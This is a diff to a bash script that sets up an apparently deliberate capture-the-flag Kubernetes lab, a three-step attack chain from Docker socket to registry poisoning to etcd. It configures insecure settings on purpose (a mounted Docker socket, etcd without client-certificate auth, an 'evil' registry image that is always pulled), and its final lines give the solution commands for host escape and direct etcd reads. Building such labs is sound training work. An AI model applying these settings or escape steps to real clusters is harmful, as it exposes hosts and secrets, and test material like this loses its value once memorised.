@@ -1,7 +1,9 @@
 #!/bin/bash
 set -euo pipefail
+K8S_ID="chain22"
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 CLUSTER_NAME="cve-chain-docker-etcd"
+source "$SCRIPT_DIR/../../scripts/k8s-common.sh"
 
 echo "[Chain Docker-to-etcd] 3-step K8s attack chain"
 echo "  K8S-17 (Docker Socket) -> K8S-09 (Registry Poison) -> K8S-08 (etcd)"
@@ -13,10 +15,6 @@ FLAG1="${CVE_FLAG_1:-flag{chain22-step1-docker}}"
 FLAG2="${CVE_FLAG_2:-flag{chain22-step2-registry}}"
 FLAG3="${CVE_FLAG_3:-flag{chain22-step3-etcd}}"
 echo "$FLAG1" > "$FLAG_DIR/step1.txt"
-echo "[*] Chain flags:"
-echo "  Step 1: $FLAG1"
-echo "  Step 2: $FLAG2"
-echo "  Step 3: $FLAG3"
 
 echo "[*] Creating unified KIND cluster with Docker socket + etcd..."
 kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
@@ -25,13 +23,6 @@ apiVersion: kind.x-k8s.io/v1alpha4
 nodes:
   - role: control-plane
     image: kindest/node:v1.27.3
-    extraPortMappings:
-      - containerPort: 2379
-        hostPort: 11379
-        protocol: TCP
-      - containerPort: 5000
-        hostPort: 11500
-        protocol: TCP
     extraMounts:
       - hostPath: /var/run/docker.sock
         containerPath: /var/run/docker.sock
@@ -44,32 +35,82 @@ nodes:
           local:
             extraArgs:
               client-cert-auth: "false"
-
 KINDCFG
 
 echo "[*] Waiting for cluster stabilization..."
 kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
 sleep 10
 
-# Stage 2: Secret for registry poisoning step
-kubectl create secret generic chain22-stage2 \
-  --from-literal=flag="$FLAG2" \
-  -n default 2>/dev/null || true
+# Registry on the kind network, published on host port 11500 (in range)
+echo "[*] Starting private registry on port 11500..."
+docker rm -f chain22-registry 2>/dev/null || true
+docker run -d --name chain22-registry --network kind \
+  -p 11500:5000 \
+  -e REGISTRY_HTTP_TLS_ENABLED=false \
+  registry:2
 
-# Stage 3: Flag in etcd
-kubectl create secret generic chain22-final \
-  --from-literal=flag="$FLAG3" \
-  -n kube-system 2>/dev/null || true
+for i in $(seq 1 20); do
+  if docker push localhost:11500/evil:latest 2>/dev/null; then
+    break
+  fi
+  docker tag nginx:1.24-alpine localhost:11500/evil:latest 2>/dev/null || true
+  sleep 2
+done
 
-# Start local registry for step 2
-echo "[*] Starting private registry for step 2..."
-docker run -d --name chain22-registry \
-  --network host \
-  -e REGISTRY_HTTP_ADDR=0.0.0.0:11500 \
-  registry:2 2>/dev/null || echo "  Registry already running"
+# Step 2 flag secret + workload SA reader
+kubectl create secret generic chain22-stage2 --from-literal=flag="$FLAG2" -n default 2>/dev/null || true
+kubectl apply -f - << 'YAML'
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: chain22-secret-reader
+  namespace: default
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get", "list"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: chain22-secret-reader
+  namespace: default
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: default
+roleRef:
+  kind: Role
+  name: chain22-secret-reader
+  apiGroup: rbac.authorization.k8s.io
+---
+# Poisonable target Deployment (pull from the kind-network registry, Always)
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: chain22-target
+  namespace: default
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: chain22-target
+  template:
+    metadata:
+      labels:
+        app: chain22-target
+    spec:
+      serviceAccountName: default
+      containers:
+        - name: app
+          image: chain22-registry:5000/evil:latest
+          imagePullPolicy: Always
+YAML
 
-# Deploy Docker socket pod
-echo "[*] Deploying Docker socket pod..."
+# Step 3 final flag: custom etcd key (invisible to the Kubernetes API)
+k8s_put_etcd_key "/chain22-final" "$FLAG3"
+
+# Deploy Docker socket pod (NO flag mount - the socket escape is required)
 kubectl apply -f - << YAML
 apiVersion: v1
 kind: Pod
@@ -87,26 +128,22 @@ spec:
       volumeMounts:
         - name: docker-sock
           mountPath: /var/run/docker.sock
-        - name: host-flag
-          mountPath: /host-flag
   volumes:
     - name: docker-sock
       hostPath:
         path: /var/run/docker.sock
         type: Socket
-    - name: host-flag
-      hostPath:
-        path: /host-flag
-        type: Directory
 YAML
 
 echo "[*] Waiting for pod readiness..."
 kubectl wait --for=condition=Ready pod/chain22-pod --timeout=60s 2>/dev/null || true
+kubectl wait --for=condition=Ready pods -l app=chain22-target --timeout=60s 2>/dev/null || true
 sleep 5
 
 echo ""
 echo "[Chain Docker-to-etcd] Ready"
 echo "  Step 1: kubectl exec -it chain22-pod -- sh"
-echo "    -> docker run --rm -v /host-flag:/mnt alpine cat /mnt/step1.txt"
-echo "  Step 2: docker tag alpine:latest localhost:11500/evil:latest && docker push"
-echo "  Step 3: etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/chain22-final"
+echo "    -> docker run --rm -v /home/kianabin/cve-flags/chain22:/mnt alpine cat /mnt/step1.txt"
+echo "  Step 2: push a malicious image to localhost:11500/evil:latest, delete the target pod,"
+echo "          then exec the new pod and read /tmp/flag.txt (payload must read Secret chain22-stage2)"
+echo "  Step 3: docker run --rm --net=host curlimages/curl:latest -sk -X POST https://127.0.0.1:2379/v3/kv/range -H 'Content-Type: application/json' -d '{\"key\":\"$(printf /chain22-final | base64 -w0)\"}'"
